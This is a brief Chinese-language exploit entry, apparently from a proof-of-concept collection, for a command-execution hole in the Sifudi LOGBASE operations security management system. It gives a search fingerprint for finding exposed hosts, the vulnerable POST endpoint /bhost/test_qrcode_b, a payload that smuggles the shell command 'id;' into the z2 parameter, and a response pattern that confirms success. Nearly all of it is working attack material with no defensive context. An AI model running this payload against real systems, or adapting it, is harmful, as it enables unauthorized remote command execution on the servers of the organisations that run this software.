# 思福迪运维安全管理系统test_qrcode_bRCE漏洞

思福迪运维安全管理系统test_qrcode_b ｜ 命令执行 ｜ —
- **指纹**：`app="思福迪-LOGBASE"`
- **请求**：`POST /bhost/test_qrcode_b HTTP/1.1`

**Payload**
```
z1=1&z2="id;"&z3=bhost
```
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$